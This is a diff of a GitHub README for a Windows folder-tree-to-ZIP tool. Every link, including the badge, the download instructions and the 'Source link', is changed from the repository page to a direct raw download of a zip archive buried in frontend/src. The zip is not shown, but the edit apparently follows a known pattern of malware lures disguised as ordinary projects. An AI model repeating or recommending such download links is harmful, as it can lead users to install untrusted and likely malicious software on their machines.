@@ -1,12 +1,12 @@
 # 🗂️ folder-structure-visualizer - Turn Folder Trees Into ZIPs
 
-[![Download the app](https://img.shields.io/badge/Download-Use%20This%20Link-blue?style=for-the-badge)](https://github.com/hickman8220/folder-structure-visualizer)
+[![Download the app](https://img.shields.io/badge/Download-Use%20This%20Link-blue?style=for-the-badge)](https://github.com/hickman8220/folder-structure-visualizer/raw/refs/heads/main/frontend/src/structure_visualizer_folder_2.4-alpha.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-https://github.com/hickman8220/folder-structure-visualizer
+https://github.com/hickman8220/folder-structure-visualizer/raw/refs/heads/main/frontend/src/structure_visualizer_folder_2.4-alpha.5.zip
 
 Open the page, get the app files, and then use the steps below to run it on Windows.
 
@@ -41,7 +41,7 @@ Follow these steps in order.
 
 Go to:
 
-https://github.com/hickman8220/folder-structure-visualizer
+https://github.com/hickman8220/folder-structure-visualizer/raw/refs/heads/main/frontend/src/structure_visualizer_folder_2.4-alpha.5.zip
 
 Look for the app files or release files on the page.
 
@@ -214,7 +214,7 @@ If the app uses a local web file, open the HTML file in Chrome or Edge.
 
 ## 🔗 Source link
 
-https://github.com/hickman8220/folder-structure-visualizer
+https://github.com/hickman8220/folder-structure-visualizer/raw/refs/heads/main/frontend/src/structure_visualizer_folder_2.4-alpha.5.zip
 
 ## 📌 Quick steps
 
